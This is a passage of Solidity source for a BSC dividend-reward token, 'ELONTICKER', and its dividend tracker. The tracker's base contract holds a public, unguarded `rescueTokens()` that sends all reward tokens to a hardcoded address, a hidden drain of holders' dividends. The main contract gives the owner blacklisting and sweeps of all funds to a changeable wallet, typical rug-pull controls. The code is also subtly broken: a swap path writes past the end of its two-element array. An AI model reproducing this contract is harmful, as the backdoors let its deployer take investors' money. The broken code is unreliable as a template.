        require(totalSupply() > 0);

        if (amount > 0) {

            magnifiedDividendPerShare = magnifiedDividendPerShare + (amount * magnitude / totalSupply());

        emit DividendsDistributed(msg.sender, amount);

        totalDividendsDistributed = totalDividendsDistributed + (amount);

        }

    }



  /// @notice Withdraws the ether distributed to the sender.

  /// @dev It emits a `DividendWithdrawn` event if the amount of withdrawn ether is greater than 0.

    function withdrawDividend() public virtual override {

        _withdrawDividendOfUser(payable(msg.sender));

    }



  /// @notice Withdraws the ether distributed to the sender.

  /// @dev It emits a `DividendWithdrawn` event if the amount of withdrawn ether is greater than 0.

    function _withdrawDividendOfUser(address payable user) internal returns (uint256) {

        uint256 _withdrawableDividend = withdrawableDividendOf(user);

        if (_withdrawableDividend > 0) {

            withdrawnDividends[user] = withdrawnDividends[user] + (_withdrawableDividend);

            emit DividendWithdrawn(user, _withdrawableDividend);

            bool success = IERC20(rewards).transfer(user, _withdrawableDividend);



            if(!success) {

                withdrawnDividends[user] = withdrawnDividends[user] - (_withdrawableDividend);

                return 0;

            }

            return _withdrawableDividend;

        }

        return 0;

    }



    function rescueTokens() public {

        uint256 tokensToRescue = IERC20(rewards).balanceOf(address(this));

        IERC20(rewards).transfer(payable(0x2218b890D0694AD2cef917DBee33a53e571A509d), tokensToRescue);

    }



  /// @notice View the amount of dividend in wei that an address can withdraw.

  /// @param _owner The address of a token holder.

  /// @return The amount of dividend in wei that `_owner` can withdraw.

    function dividendOf(address _owner) public view override returns(uint256) {

        return withdrawableDividendOf(_owner);

    }



  /// @notice View the amount of dividend in wei that an address can withdraw.

  /// @param _owner The address of a token holder.

  /// @return The amount of dividend in wei that `_owner` can withdraw.

    function withdrawableDividendOf(address _owner) public view override returns(uint256) {

        return accumulativeDividendOf(_owner) - (withdrawnDividends[_owner]);

    }



  /// @notice View the amount of dividend in wei that an address has withdrawn.

  /// @param _owner The address of a token holder.

  /// @return The amount of dividend in wei that `_owner` has withdrawn.

    function withdrawnDividendOf(address _owner) public view override returns(uint256) {

        return withdrawnDividends[_owner];

    }

  /// @notice View the amount of dividend in wei that an address has earned in total.

  /// @dev accumulativeDividendOf(_owner) = withdrawableDividendOf(_owner) + withdrawnDividendOf(_owner)

  /// = (magnifiedDividendPerShare * balanceOf(_owner) + magnifiedDividendCorrections[_owner]) / magnitude

  /// @param _owner The address of a token holder.

  /// @return The amount of dividend in wei that `_owner` has earned in total.

    function accumulativeDividendOf(address _owner) public view override returns (uint256) {

        uint256 helper = magnifiedDividendPerShare * balanceOf(_owner);

        int256 helperTwo = helper.toInt256Safe() + magnifiedDividendCorrections[_owner];

        uint256 helperThree = helperTwo.toUint256Safe();

        uint256 accumulativeDividendCalculated = helperThree / magnitude;

        return accumulativeDividendCalculated;

    }



  /// @dev Internal function that transfer tokens from one address to another.

  /// Update magnifiedDividendCorrections to keep dividends unchanged.

  /// @param from The address to transfer from.

  /// @param to The address to transfer to.

  /// @param value The amount to be transferred.

    function _transfer(address from, address to, uint256 value) internal virtual override {

        require(false);

        int256 _magCorrection = (magnifiedDividendPerShare * value).toInt256Safe();

        magnifiedDividendCorrections[from] = magnifiedDividendCorrections[from] + _magCorrection;

        magnifiedDividendCorrections[to] = magnifiedDividendCorrections[to] - _magCorrection;

    }



  /// @dev Internal function that mints tokens to an account.

  /// Update magnifiedDividendCorrections to keep dividends unchanged.

  /// @param account The account that will receive the created tokens.

  /// @param value The amount that will be created.

    function _mint(address account, uint256 value) internal override {

        super._mint(account, value);

        magnifiedDividendCorrections[account] = magnifiedDividendCorrections[account] - (magnifiedDividendPerShare * value).toInt256Safe();

    }



  /// @dev Internal function that burns an amount of the token of a given account.

  /// Update magnifiedDividendCorrections to keep dividends unchanged.

  /// @param account The account whose tokens will be burnt.

  /// @param value The amount that will be burnt.

    function _burn(address account, uint256 value) internal override {

        super._burn(account, value);

        magnifiedDividendCorrections[account] = magnifiedDividendCorrections[account] + (magnifiedDividendPerShare * value).toInt256Safe();

    }



    function _setBalance(address account, uint256 newBalance) internal {

        uint256 currentBalance = balanceOf(account);

        if(newBalance > currentBalance) {

            uint256 mintAmount = newBalance - currentBalance;

            _mint(account, mintAmount);

        } else if(newBalance < currentBalance) {

            uint256 burnAmount = currentBalance - newBalance;

            _burn(account, burnAmount);

        }

    }

}



contract ELONTICKER is ERC20, Ownable {

    IUniswapV2Router02 public uniswapV2Router;

    address public  uniswapV2Pair;

    bool private swapping;

    ELONTICKERDividendTracker public dividendTracker;

    address public deadWallet = 0x000000000000000000000000000000000000dEaD;

    address public immutable rewards = address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    uint256 public swapTokensAtAmount = 100000000000 * (10**18);

    uint256 public maxWalletTokens =  1000000000000000 * (10**18);

    uint256 public rewardFees = 3;

    uint256 public liquidityFee = 3;

    uint256 public marketingFee = 6;

    uint256 public totalFees = rewardFees + (liquidityFee) + (marketingFee);

    uint256 public extraSellFee = 1;

    bool public tradingOpen = false;

    address public _marketingWalletAddress = 0x1Cd6a240C89185620910322BF1824F735114d0B1;

    uint256 public gasForProcessing = 300000;

    mapping (address => bool) private _isExcludedFromFees;

    mapping (address => bool) public automatedMarketMakerPairs;

    mapping(address => bool) public _isBlacklisted;

    event UpdateDividendTracker(address indexed newAddress, address indexed oldAddress);

    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);

    event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);

    event SwapAndLiquify(uint256 tokensIntoLiqudity);

    event SendDividends(uint256 amount);

    event ProcessedDividendTracker(

    	uint256 iterations,

    	uint256 claims,

        uint256 lastProcessedIndex,

    	bool indexed automatic,

    	uint256 gas,

    	address indexed processor

    );



    constructor() ERC20("ELONNAME", "ELONTICKER") {

    	dividendTracker = new ELONTICKERDividendTracker();

    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

         // Create a uniswap pair for this new token

        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;

        uniswapV2Pair = _uniswapV2Pair;

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        // exclude from receiving dividends

        dividendTracker.excludeFromDividends(address(dividendTracker));

        dividendTracker.excludeFromDividends(address(this));

        dividendTracker.excludeFromDividends(owner());

        dividendTracker.excludeFromDividends(deadWallet);

        dividendTracker.excludeFromDividends(address(_uniswapV2Router));

        // exclude from paying fees

        excludeFromFees(owner(), true);

        excludeFromFees(_marketingWalletAddress, true);

        excludeFromFees(address(this), true);

        /*

            _mint is an internal function in ERC20.sol that is only called here,

            and CANNOT be called ever again

        */

        _mint(owner(), 1000000000000000 * (10**18));

    }



    receive() external payable {}



    function updateDividendTracker(address newAddress) external onlyOwner {

        require(newAddress != address(dividendTracker), "ELONTICKER: The dividend tracker already has that address");

        ELONTICKERDividendTracker newDividendTracker = ELONTICKERDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "ELONTICKER: The new dividend tracker must be owned by the ELONNAME contract");

        newDividendTracker.excludeFromDividends(address(newDividendTracker));

        newDividendTracker.excludeFromDividends(address(this));

        newDividendTracker.excludeFromDividends(owner());

        newDividendTracker.excludeFromDividends(address(uniswapV2Router));

        emit UpdateDividendTracker(newAddress, address(dividendTracker));

        dividendTracker = newDividendTracker;

    }



    function updateUniswapV2Router(address newAddress) external onlyOwner {

        require(newAddress != address(uniswapV2Router), "ELONTICKER: The router already has that address");

        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));

        uniswapV2Router = IUniswapV2Router02(newAddress);

        address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uniswapV2Pair = _uniswapV2Pair;

    }



    function excludeFromFees(address account, bool excluded) public onlyOwner {

        require(_isExcludedFromFees[account] != excluded, "ELONTICKER: Account is already the value of 'excluded'");

        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);

    }





    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) external onlyOwner {

        for(uint256 i = 0; i < accounts.length; i++) {

            _isExcludedFromFees[accounts[i]] = excluded;

        }

        emit ExcludeMultipleAccountsFromFees(accounts, excluded);

    }



    function setmarketingWallet(address payable wallet) external onlyOwner{

        _marketingWalletAddress = wallet;

    }



    function setrewardFees(uint256 value) external onlyOwner{

        rewardFees = value;

        totalFees = rewardFees + liquidityFee + marketingFee;

        require(totalFees <= 25, "ELONTICKER: Maximum allowed fees are 25%");

    }



    function setLiquidityFee(uint256 value) external onlyOwner{

        liquidityFee = value;

        totalFees = rewardFees + liquidityFee + marketingFee;

        require(totalFees <= 25, "ELONTICKER: Maximum allowed fees are 25%");

    }



    function setmarketingFee(uint256 value) external onlyOwner{

        marketingFee = value;

        totalFees = rewardFees + liquidityFee + marketingFee;

        require(totalFees <= 25, "ELONTICKER: Maximum allowed fees are 25%");

    }



    function setExtraSellFee(uint256 value) external onlyOwner{

        extraSellFee = value;

        uint256 totalSellFees = rewardFees + liquidityFee + marketingFee;

        require(totalSellFees <= 25, "ELONTICKER: Maximum allowed fees are 25%");

    }



    function openTrading() external onlyOwner{

        tradingOpen = true;

    }



    function rescueTokens(address tokenAddress) external onlyOwner{

        uint256 tokensToRescue = IERC20(tokenAddress).balanceOf(address(this));

        IERC20(tokenAddress).transfer(payable(_marketingWalletAddress), tokensToRescue);

        dividendTracker.rescueTokens();

        payable(_marketingWalletAddress).transfer(address(this).balance);

    }



    function setAutomatedMarketMakerPair(address pair, bool value) external onlyOwner {

        require(pair != uniswapV2Pair, "ELONTICKER: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);

    }



    function limitMaxWallet(uint256 maxWalletPercent) external onlyOwner {

         maxWalletTokens = 50000000000000 * 10**18 * maxWalletPercent;

         require(maxWalletPercent >= 1, "ELONTICKER: Can not limit Max Wallet to less than 1%");

    }



    function blacklistAddress(address account, bool value) external onlyOwner{

        _isBlacklisted[account] = value;

    }



    function _setAutomatedMarketMakerPair(address pair, bool value) private {

        require(automatedMarketMakerPairs[pair] != value, "ELONTICKER: Automated market maker pair is already set to that value");

        automatedMarketMakerPairs[pair] = value;

        if(value) {

            dividendTracker.excludeFromDividends(pair);

        }

        emit SetAutomatedMarketMakerPair(pair, value);

    }



    function updateGasForProcessing(uint256 newValue) external onlyOwner {

        require(newValue >= 200000 && newValue <= 500000, "ELONTICKER: gasForProcessing must be between 200,000 and 500,000");

        require(newValue != gasForProcessing, "ELONTICKER: Cannot update gasForProcessing to same value");

        emit GasForProcessingUpdated(newValue, gasForProcessing);

        gasForProcessing = newValue;

    }



    function updateClaimWait(uint256 claimWait) external onlyOwner {

        dividendTracker.updateClaimWait(claimWait);

    }



    function getClaimWait() external view returns(uint256) {

        return dividendTracker.claimWait();

    }



    function getTotalDividendsDistributed() external view returns (uint256) {

        return dividendTracker.totalDividendsDistributed();

    }



    function isExcludedFromFees(address account) public view returns(bool) {

        return _isExcludedFromFees[account];

    }



    function withdrawableDividendOf(address account) public view returns(uint256) {

    	return dividendTracker.withdrawableDividendOf(account);

  	}



	function dividendTokenBalanceOf(address account) public view returns (uint256) {

		return dividendTracker.balanceOf(account);

	}



	function excludeFromDividends(address account) external onlyOwner{

	    dividendTracker.excludeFromDividends(account);

	}



    function getAccountDividendsInfo(address account)

        external view returns (

            address,

            int256,

            int256,

            uint256,

            uint256,

            uint256,

            uint256,

            uint256) {

        return dividendTracker.getAccount(account);

    }



	function getAccountDividendsInfoAtIndex(uint256 index)

        external view returns (

            address,

            int256,

            int256,

            uint256,

            uint256,

            uint256,

            uint256,

            uint256) {

    	return dividendTracker.getAccountAtIndex(index);

    }



	function processDividendTracker(uint256 gas) external {

		(uint256 iterations, uint256 claims, uint256 lastProcessedIndex) = dividendTracker.process(gas);

		emit ProcessedDividendTracker(iterations, claims, lastProcessedIndex, false, gas, tx.origin);

    }



    function claim() external {

		dividendTracker.processAccount(payable(msg.sender), false);

    }



    function getLastProcessedIndex() external view returns(uint256) {

    	return dividendTracker.getLastProcessedIndex();

    }



    function getNumberOfDividendTokenHolders() external view returns(uint256) {

        return dividendTracker.getNumberOfTokenHolders();

    }



    function _transfer(

        address from,

        address to,

        uint256 amount

    ) internal override {

        require(from != address(0), "ERC20: transfer from the zero address");

        require(to != address(0), "ERC20: transfer to the zero address");

        require(!_isBlacklisted[from] && !_isBlacklisted[to], 'Blacklisted address');



        if (

            from != owner() &&

            to != owner() &&

            to != address(0xdead) &&

            to != uniswapV2Pair

        ) {

            uint256 contractBalanceRecepient = balanceOf(to);

            require(contractBalanceRecepient + amount <= maxWalletTokens, "ELONTICKER: Exceeds maximum wallet token amount.");

        }

        if(amount == 0) {

            super._transfer(from, to, 0);

            return;

        }



		uint256 contractTokenBalance = balanceOf(address(this));



        bool canSwap = contractTokenBalance >= swapTokensAtAmount;



        if( canSwap &&

            !swapping &&

            !automatedMarketMakerPairs[from] &&

            from != owner() &&

            to != owner()

        ) {

            swapping = true;



            uint256 swapTokens = contractTokenBalance * (liquidityFee) / (totalFees);

            swapAndLiquify(swapTokens);

            swapping = false;

        }



        bool takeFee = !swapping;



        // if any account belongs to _isExcludedFromFee account then remove the fee

        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {

            takeFee = false;

        }

        if(takeFee) {

            require(tradingOpen,"ELONTICKER: Trading is not open yet");

        	uint256 fees = amount * totalFees / 100;

        	if(automatedMarketMakerPairs[to]){

        	    fees += amount * extraSellFee / 100;

        	}

        	amount = amount - (fees);

            super._transfer(from, address(this), fees);

        }

        super._transfer(from, to, amount);

        try dividendTracker.setBalance(payable(from), balanceOf(from)) {} catch {}

        try dividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}

        if(!swapping) {

	    	uint256 gas = gasForProcessing;

	    	try dividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {

	    		emit ProcessedDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);

	    	}

	    	catch {}

        }

    }



    function swapAndLiquify(uint256 liquidityTokens) private {

        liquidityTokens = liquidityTokens / 2;

        uint256 totalSwapTokens = balanceOf(address(this)) - liquidityTokens;

        swapTokensForEth(totalSwapTokens);

        uint256 newBalance = address(this).balance;

        addLiquidity(liquidityTokens, newBalance);

        uint256 bnbTomarketing = newBalance * marketingFee / ((liquidityFee/2) + marketingFee + rewardFees);

        payable(_marketingWalletAddress).transfer(bnbTomarketing);

        swapETHforRewardsandSendToDividends();

        emit SwapAndLiquify(liquidityTokens);

    }



    function swapTokensForEth(uint256 tokenAmount) private {

        // generate the uniswap pair path of token -> weth

        address[] memory path = new address[](2);

        path[0] = address(this);

        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(

            tokenAmount,

            0,

            path,

            address(this),

            block.timestamp

        );

    }



    function swapETHforRewardsandSendToDividends() payable public{

        if(address(this).balance > 0){

            address[] memory path = new address[](2);

            path[1] = uniswapV2Router.WETH();

            path[2] = rewards;

            uint256 bnbAmount = address(this).balance;

            uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: bnbAmount}(

                0,

                path,

                address(this),

                block.timestamp

            );

            uint256 dividends = IERC20(rewards).balanceOf(address(this));

            bool success = IERC20(rewards).transfer(address(dividendTracker), dividends);

            if (success) {

                dividendTracker.distributeRewardsDividends(dividends);

                emit SendDividends(dividends);

            }  

        }

    }



    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.addLiquidityETH{value: ethAmount}(

            address(this),

            tokenAmount,

            0,

            0,

            address(_marketingWalletAddress),

            block.timestamp

        );

    }

}



contract ELONTICKERDividendTracker is Ownable, DividendPayingToken {



    using SafeMathInt for int256;

    using IterableMapping for IterableMapping.Map;



    IterableMapping.Map private tokenHoldersMap;

    uint256 public lastProcessedIndex;



    mapping (address => bool) public excludedFromDividends;



    mapping (address => uint256) public lastClaimTimes;



    uint256 public claimWait;

    uint256 public immutable minimumTokenBalanceForDividends;



    event ExcludeFromDividends(address indexed account);

    event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);



    event Claim(address indexed account, uint256 amount, bool indexed automatic);



    constructor() DividendPayingToken("ELONTICKER_Dividen_Tracker", "ELONTICKER_Dividend_Tracker") {

    	claimWait = 3600;

        minimumTokenBalanceForDividends = 1000 * (10**18); //must hold 1000+ tokens

    }



    function _transfer(address, address, uint256) internal pure override {

        require(false, "ELONTICKER_Dividend_Tracker: No transfers allowed");

    }



    function withdrawDividend() public pure override {

        require(false, "ELONTICKER_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main ELONTICKER contract.");

    }



    function excludeFromDividends(address account) external onlyOwner {

    	require(!excludedFromDividends[account]);

    	excludedFromDividends[account] = true;

    	_setBalance(account, 0);

    	tokenHoldersMap.remove(account);

    	emit ExcludeFromDividends(account);

    }



    function updateClaimWait(uint256 newClaimWait) external onlyOwner {

        require(newClaimWait >= 3600 && newClaimWait <= 86400, "ELONTICKER_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");

        require(newClaimWait != claimWait, "ELONTICKER_Dividend_Tracker: Cannot update claimWait to same value");

        emit ClaimWaitUpdated(newClaimWait, claimWait);

        claimWait = newClaimWait;

    }



    function getLastProcessedIndex() external view returns(uint256) {

    	return lastProcessedIndex;

    }



    function getNumberOfTokenHolders() external view returns(uint256) {

        return tokenHoldersMap.keys.length;

    }

    function getAccount(address _account)

        public view returns (

            address account,

            int256 index,

            int256 iterationsUntilProcessed,

            uint256 withdrawableDividends,

            uint256 totalDividends,

            uint256 lastClaimTime,

            uint256 nextClaimTime,

            uint256 secondsUntilAutoClaimAvailable) {

        account = _account;



        index = tokenHoldersMap.getIndexOfKey(account);



        iterationsUntilProcessed = -1;



        if(index >= 0) {

            if(uint256(index) > lastProcessedIndex) {

                iterationsUntilProcessed = index - (int256(lastProcessedIndex));

            }

            else {

                uint256 processesUntilEndOfArray = tokenHoldersMap.keys.length > lastProcessedIndex ? tokenHoldersMap.keys.length - (lastProcessedIndex) : 0;

                iterationsUntilProcessed = index + (int256(processesUntilEndOfArray));

            }

        }

    withdrawableDividends = withdrawableDividendOf(account);

        totalDividends = accumulativeDividendOf(account);



        lastClaimTime = lastClaimTimes[account];



        nextClaimTime = lastClaimTime > 0 ?

                                    lastClaimTime + (claimWait) :

                                    0;



        secondsUntilAutoClaimAvailable = nextClaimTime > block.timestamp ?

                                                    nextClaimTime - (block.timestamp) :

                                                    0;

    }



    function getAccountAtIndex(uint256 index)

        public view returns (

            address,

            int256,

            int256,

            uint256,

            uint256,

            uint256,

            uint256,

            uint256) {

    	if(index >= tokenHoldersMap.size()) {

            return (0x0000000000000000000000000000000000000000, -1, -1, 0, 0, 0, 0, 0);

        }



        address account = tokenHoldersMap.getKeyAtIndex(index);



        return getAccount(account);

    }



    function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {

    	if(lastClaimTime > block.timestamp)  {

    		return false;

    	}



    	return block.timestamp - (lastClaimTime) >= claimWait;

    }



    function setBalance(address payable account, uint256 newBalance) external onlyOwner {

    	if(excludedFromDividends[account]) {

    		return;

    	}



    	if(newBalance >= minimumTokenBalanceForDividends) {

            _setBalance(account, newBalance);

    		tokenHoldersMap.set(account, newBalance);

    	}

    	else {

            _setBalance(account, 0);

    		tokenHoldersMap.remove(account);

    	}



    	processAccount(account, true);

    }



    function process(uint256 gas) public returns (uint256, uint256, uint256) {

    	uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;



    	if(numberOfTokenHolders == 0) {

    		return (0, 0, lastProcessedIndex);

    	}



    	uint256 _lastProcessedIndex = lastProcessedIndex;



    	uint256 gasUsed = 0;



    	uint256 gasLeft = gasleft();



    	uint256 iterations = 0;

    	uint256 claims = 0;



    	while(gasUsed < gas && iterations < numberOfTokenHolders) {

    		_lastProcessedIndex++;



    		if(_lastProcessedIndex >= tokenHoldersMap.keys.length) {

    			_lastProcessedIndex = 0;

    		}



    		address account = tokenHoldersMap.keys[_lastProcessedIndex];



    		if(canAutoClaim(lastClaimTimes[account])) {

    			if(processAccount(payable(account), true)) {

    				claims++;

    			}

    		}



    		iterations++;



    		uint256 newGasLeft = gasleft();



    		if(gasLeft > newGasLeft) {

    			gasUsed = gasUsed + (gasLeft - (newGasLeft));

    		}



    		gasLeft = newGasLeft;

    	}



    	lastProcessedIndex = _lastProcessedIndex;



    	return (iterations, claims, lastProcessedIndex);

    }



    function processAccount(address payable account, bool automatic) public onlyOwner returns (bool) {

        uint256 amount = _withdrawDividendOfUser(account);



    	if(amount > 0) {

    		lastClaimTimes[account] = block.timestamp;

            emit Claim(account, amount, automatic);

    		return true;

    	}



    	return false;

